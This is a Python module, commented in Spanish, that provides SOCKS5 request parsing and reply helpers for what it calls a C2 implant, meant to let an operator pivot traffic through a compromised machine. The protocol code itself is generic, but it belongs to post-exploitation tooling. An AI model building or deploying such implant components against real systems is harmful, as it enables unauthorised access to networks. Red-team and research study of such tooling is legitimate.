"""Módulo SOCKS proxy para el implant C2.

Permite al implant actuar como relay de tráfico SOCKS5,
habilitando pivoting a través de la máquina comprometida.

El relay real se ejecuta en implant.py (socks_relay_loop). Esta clase
proporciona helpers para parsear y generar protocolo SOCKS5.
"""
import socket
import struct


# SOCKS5 constants
SOCKS5_VERSION = 0x05
SOCKS5_AUTH_NONE = 0x00
SOCKS5_AUTH_USERPASS = 0x02
SOCKS5_CMD_CONNECT = 0x01
SOCKS5_ATYP_IPV4 = 0x01
SOCKS5_ATYP_DOMAIN = 0x03
SOCKS5_ATYP_IPV6 = 0x04
SOCKS5_REP_OK = 0x00
SOCKS5_REP_CONN_REFUSED = 0x05


class SOCKSClient:
    """Cliente SOCKS5 que opera a través del canal C2.

    Esta clase se usa para parsear solicitudes SOCKS5 recibidas del
    servidor C2 y generar respuestas válidas. El relay de datos se
    maneja en implant.py.
    """

    def __init__(self, c2_url, auth_token, agent_id):
        self.c2_url = c2_url.rstrip("/")
        self.auth_token = auth_token
        self.agent_id = agent_id

    def parse_connect_request(self, data):
        """Parsea una solicitud SOCKS5 CONNECT.

        Args:
            data: Bytes de la solicitud SOCKS5

        Returns:
            dict con {host, port, atyp} o None si es inválida.
        """
        try:
            if len(data) < 4:
                return None

            version = data[0]
            if version != SOCKS5_VERSION:
                return None

            command = data[1]
            if command != SOCKS5_CMD_CONNECT:
                return None

            atyp = data[3]

            if atyp == SOCKS5_ATYP_IPV4:
                if len(data) < 10:
                    return None
                addr = socket.inet_ntoa(data[4:8])
                port = struct.unpack("!H", data[8:10])[0]
            elif atyp == SOCKS5_ATYP_DOMAIN:
                domain_len = data[4]
                if len(data) < 5 + domain_len + 2:
                    return None
                addr = data[5 : 5 + domain_len].decode()
                port = struct.unpack("!H", data[5 + domain_len : 7 + domain_len])[0]
            elif atyp == SOCKS5_ATYP_IPV6:
                if len(data) < 22:
                    return None
                addr = socket.inet_ntop(socket.AF_INET6, data[4:20])
                port = struct.unpack("!H", data[20:22])[0]
            else:
                return None

            return {"host": addr, "port": port, "atyp": atyp}

        except Exception:
            return None

    @staticmethod
    def success_reply():
        """Genera respuesta SOCKS5 de éxito."""
        reply = struct.pack(
            "!BBBB", SOCKS5_VERSION, SOCKS5_REP_OK, 0x00, SOCKS5_ATYP_IPV4
        )
        reply += socket.inet_aton("0.0.0.0") + struct.pack("!H", 0)
        return reply

    @staticmethod
    def error_reply(rep=SOCKS5_REP_CONN_REFUSED):
        """Genera respuesta de error SOCKS5."""
        reply = struct.pack(
            "!BBBB", SOCKS5_VERSION, rep, 0x00, SOCKS5_ATYP_IPV4
        )
        reply += socket.inet_aton("0.0.0.0") + struct.pack("!H", 0)
        return reply
